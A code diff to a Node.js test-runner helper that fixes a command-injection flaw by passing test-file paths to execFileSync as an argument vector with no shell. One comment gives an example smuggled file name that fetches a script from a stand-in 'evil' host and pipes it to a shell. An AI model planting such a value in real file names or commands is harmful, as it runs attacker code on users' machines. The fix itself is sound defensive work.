@@ -22,7 +22,7 @@
  *    Consumed by src/commands/push.js.
  */
 
-const { execSync } = require('child_process');
+const { execSync, execFileSync } = require('child_process');
 const path = require('path');
 const safeFs = require('./safe-fs');
 
@@ -108,6 +108,54 @@ function runCommand(cmd, options = {}) {
     }
     // Non-allowFail callers (e.g. pushToRemote's `git push`) rely on throw-to-fail;
     // returning here would let them mistake a timeout for success. Re-throw loudly.
+    throw err;
+  }
+}
+
+/**
+ * Run a command via an ARGV VECTOR (no shell) and capture output.
+ *
+ * The injection-safe sibling of {@link runCommand}: the binary and each argument are
+ * passed as SEPARATE elements to execFileSync with `shell:false`, so NO shell (/bin/sh
+ * -c) ever interprets an operand. This is the ONLY path used for runSpecificTests'
+ * per-framework invocations, whose test-file/package operands originate from
+ * `.ctoc/state/coverage-map.json` (arbitrary, unsanitized strings) or a filename
+ * heuristic. On the old `execSync(\`npx jest ${files.join(' ')}\`)` string path a
+ * path like `a$(curl -s evil|sh).test.js` was a shell command substitution and ran
+ * arbitrary code on every `/ctoc:push`; here it is one literal argv element, inert.
+ *
+ * Contract mirrors runCommand EXACTLY — same {silent, allowFail, timeout} options and
+ * the same {success, output, error?, timedOut?} return shape — so the allowFail
+ * capture (read err.stdout/err.status without throwing), the silent flag, and the
+ * pass-count parsing all behave identically to the shell path.
+ *
+ * @param {string} bin - the executable (an argv[0], never a shell string)
+ * @param {string[]} args - argument vector; each element is passed literally
+ * @param {{silent?: boolean, allowFail?: boolean, timeout?: number}} [options]
+ * @returns {{success: boolean, output: string, error?: string, timedOut?: boolean}}
+ */
+function runCommandArgv(bin, args, options = {}) {
+  const { silent = false, allowFail = false, timeout = 300000 } = options;
+
+  try {
+    const output = execFileSync(bin, args, {
+      encoding: 'utf8',
+      stdio: silent ? 'pipe' : 'inherit',
+      shell: false, // the whole point: no shell parses the operands
+      maxBuffer: 10 * 1024 * 1024, // 10MB
+      timeout
+    });
+    return { success: true, output: output?.trim() || '' };
+  } catch (err) {
+    // A test framework exits non-zero on failing tests but still prints its report to
+    // stdout (carried on err.stdout) — the allowFail path reads it, exactly like
+    // runCommand. A timeout is surfaced LOUDLY, never swallowed.
+    const timedOut = Boolean(err.killed) || err.signal === 'SIGTERM' || err.code === 'ETIMEDOUT';
+    if (allowFail) {
+      const result = { success: false, output: err.stdout || '', error: err.message };
+      if (timedOut) result.timedOut = true;
+      return result;
+    }
     throw err;
   }
 }
@@ -213,13 +261,23 @@ function runSpecificTests(tools, testFiles) {
   for (const [_lang, langTools] of Object.entries(tools)) {
     if (!langTools.test) continue;
 
-    let cmd;
+    // COMMAND-INJECTION FIX: testFiles come from .ctoc/state/coverage-map.json
+    // (entry.tests — arbitrary, unsanitized strings) or a filename heuristic. They
+    // MUST NEVER be interpolated into a shell command string. Every per-framework
+    // invocation runs on the argv-safe path (runCommandArgv → execFileSync,
+    // shell:false), so a path like `a$(...).test.js` is one literal argv element, not
+    // a shell substitution. This mirrors the established pattern in sca-runner.js /
+    // sast-runner.js / secrets-scanner.js. On Windows the npx launcher is a `.cmd`
+    // shim, mirroring sca-runner's `npm.cmd` handling.
+    const npx = process.platform === 'win32' ? 'npx.cmd' : 'npx';
+
+    let result;
     if (langTools.testFramework === 'jest') {
-      cmd = `npx jest ${testFiles.join(' ')}`;
+      result = runCommandArgv(npx, ['jest', ...testFiles], { allowFail: true, silent: true });
     } else if (langTools.testFramework === 'vitest') {
-      cmd = `npx vitest run ${testFiles.join(' ')}`;
+      result = runCommandArgv(npx, ['vitest', 'run', ...testFiles], { allowFail: true, silent: true });
     } else if (langTools.testFramework === 'pytest') {
-      cmd = `pytest ${testFiles.join(' ')}`;
+      result = runCommandArgv('pytest', [...testFiles], { allowFail: true, silent: true });
     } else if (langTools.testFramework === 'go') {
       // For Go, convert file paths to package paths. Go import paths are ALWAYS
       // forward-slashed, so normalize both separators to '/' FIRST (a Windows
@@ -230,13 +288,13 @@ function runSpecificTests(tools, testFiles) {
         const unix = f.split(/[\\/]+/).join('/');
         return './' + path.posix.dirname(unix) + '/...';
       }))];
-      cmd = `go test ${packages.join(' ')}`;
+      result = runCommandArgv('go', ['test', ...packages], { allowFail: true, silent: true });
     } else {
-      // Fallback: run full suite
-      cmd = langTools.test;
+      // Fallback: run the full suite. langTools.test is a CONFIGURED command string
+      // from the detector (e.g. `npm test`) with NO file-derived interpolation, so it
+      // legitimately stays on the shell path — a user's `npm test && ...` still works.
+      result = runCommand(langTools.test, { allowFail: true, silent: true });
     }
-
-    const result = runCommand(cmd, { allowFail: true, silent: true });
 
     if (!result.success) {
       return {
@@ -1095,6 +1153,7 @@ if (require.main === module) {
 module.exports = {
   parseArgs,
   runCommand,
+  runCommandArgv,
   classifySeverity,
   runLint,
   runTypecheck,
